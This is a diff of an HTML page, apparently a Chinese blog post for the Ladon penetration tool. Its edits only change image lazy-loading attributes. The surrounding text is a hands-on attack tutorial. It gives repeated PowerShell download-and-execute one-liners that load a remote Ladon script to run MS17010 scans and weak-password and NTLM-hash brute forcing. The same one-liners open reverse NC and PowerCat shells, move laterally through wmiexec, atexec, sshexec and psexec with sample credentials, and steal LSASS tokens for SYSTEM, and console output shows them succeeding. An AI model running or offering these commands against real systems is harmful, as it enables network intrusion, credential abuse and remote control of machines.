@@ -75,7 +75,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -175,38 +175,38 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <p>使用命令 Ladon web 800 架设一个WEB服务器，用于远程下载脚本<br>
 实战可架设在VPS，或者架设在目标内网机器（因为有机器不能出网）<br>
 将脚本放在WEB目录下即可，当然大家也可以用IIS或APACHE搭建WEB</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/Ladon_web.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/Ladon_web.PNG"></p>
 <h3 id="远程加载MS17010漏洞扫描">远程加载MS17010漏洞扫描</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon 192.168.1.8/24 MS17010”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_ms17010.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_ms17010.PNG"></p>
 <h3 id="远程加载Oracle弱口令爆破">远程加载Oracle弱口令爆破</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon 192.168.1.141 OracleScan”</p>
 <h3 id="远程加载SmbScan-445端口弱口令爆破">远程加载SmbScan 445端口弱口令爆破</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon 192.168.1.141 SmbScan”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_smbscan.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_smbscan.PNG"></p>
 <h3 id="远程加载WmiScan-135端口弱口令爆破">远程加载WmiScan 135端口弱口令爆破</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon 192.168.1.141 WmiScan”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_wmiscan.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_wmiscan.PNG"></p>
 <h3 id="远程加载SmbHash爆破内网主机（NtlmHash）">远程加载SmbHash爆破内网主机（NtlmHash）</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon 192.168.1.40 SmbHash”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_smbhash.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_smbhash.PNG"></p>
 <h3 id="远程加载WmiHash爆破内网主机（NtlmHash）">远程加载WmiHash爆破内网主机（NtlmHash）</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon 192.168.1.40 WmiHash”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_wmihash.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_wmihash.PNG"></p>
 <h3 id="远程加载反弹NC-SHELL">远程加载反弹NC SHELL</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon ReverseTcp 192.168.1.3 4444 nc”</p>
 <h3 id="远程加载PowerCat反弹NC-SHELL">远程加载PowerCat反弹NC SHELL</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.110:800/Ladon6.6_all.ps1">http://192.168.1.110:800/Ladon6.6_all.ps1</a>’); Ladon PowerCat  192.168.1.110 4444 cmd”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_powercat.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_powercat.PNG"></p>
 <h3 id="远程加载WMI内网横向">远程加载WMI内网横向</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon wmiexec 192.168.1.40 administrator k8gege520 whoami”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_wmiexec.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_wmiexec.PNG"></p>
 <h3 id="远程加载atexec内网横向">远程加载atexec内网横向</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon atexec 192.168.1.40 administrator k8gege520 whoami”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_atexec.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_atexec.PNG"></p>
 <h3 id="远程加载sshexec内网横向">远程加载sshexec内网横向</h3>
 <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.3:800/Ladon6.6_all.ps1">http://192.168.1.3:800/Ladon6.6_all.ps1</a>’); Ladon sshexec 192.168.1.40 root k8gege520 whoami”<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_sshexec.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_sshexec.PNG"></p>
 <h3 id="远程加载SMBHASH爆破内网主机（NtlmHash）">远程加载SMBHASH爆破内网主机（NtlmHash）</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop\runnet&gt;powershell <span class="string">"IEX (New-Object Net.WebClient).Download</span></span><br><span class="line"><span class="string">String('http://192.168.1.3:800/Ladon6.6_all.ps1'); Ladon 192.168.1.40 smbhash"</span></span><br><span class="line">Ladon 6.6</span><br><span class="line">Start: 2020-07-03 17:12:31</span><br><span class="line">Runtime: .net 2.0  OS Arch: x86</span><br><span class="line">OS Name: Microsoft Windows 7 旗舰版</span><br><span class="line">192.168.1.40</span><br><span class="line">load SmbHashScan</span><br><span class="line">ICMP: 192.168.1.40      00-0C-29-0E-1D-50       VMware</span><br><span class="line">192.168.1.40 445 Open</span><br><span class="line">SmbHashCheck 192.168.1.40 administrator BCB4DEE13F1BE64A85DE5769056E3008</span><br><span class="line">Successfully authenticated to the target</span><br><span class="line">Found 192.168.1.40 administrator BCB4DEE13F1BE64A85DE5769056E3008 ISOK</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2020-07-03 17:12:35</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="远程加载psexec内网横向">远程加载psexec内网横向</h3>
@@ -216,16 +216,16 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h3 id="远程加载wmiexec内网横向">远程加载wmiexec内网横向</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop\runnet&gt;powershell <span class="string">"IEX (New-Object Net.WebClient).Download</span></span><br><span class="line"><span class="string">String('http://192.168.1.3:800/Ladon6.6_all.ps1'); Ladon wmiexec 192.168.1.40 ad</span></span><br><span class="line"><span class="string">ministrator k8gege520 whoami"</span></span><br><span class="line">Ladon 6.6</span><br><span class="line">Start: 2020-07-03 17:17:28</span><br><span class="line">Runtime: .net 2.0  OS Arch: x86</span><br><span class="line">OS Name: Microsoft Windows 7 旗舰版</span><br><span class="line">Load WmiExec</span><br><span class="line">[!] Connecting with administrator</span><br><span class="line">[i] Connecting to 192.168.1.40</span><br><span class="line">[i] Connected</span><br><span class="line">[i] Command: <span class="built_in">whoami</span></span><br><span class="line">[i] Running <span class="built_in">command</span>...</span><br><span class="line">[i] Getting stdout from registry from SOFTWARE\</span><br><span class="line">[i] Full <span class="built_in">command</span> output received</span><br><span class="line">win-4udh62v7dmn\administrator</span><br></pre></td></tr></tbody></table></figure>
 <h3 id="获取本机IP与外网IP">获取本机IP与外网IP</h3>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_getip.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_getip.PNG"></p>
 <h3 id="使用指定用户执行命令">使用指定用户执行命令</h3>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_runas.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_runas.PNG"></p>
 <h3 id="窃取指定进程令牌权限执行命令，如LSASS获取SYSTEM权限">窃取指定进程令牌权限执行命令，如LSASS获取SYSTEM权限</h3>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/ps/ps_getsystem.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/ps/ps_getsystem.PNG"></p>
 <h3 id="工具下载">工具下载</h3>
 <p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>
 历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" class="lazyload" data-src="https://k8gege.org/img/k8team.jpg">
 </div>
     </div>
 </article>
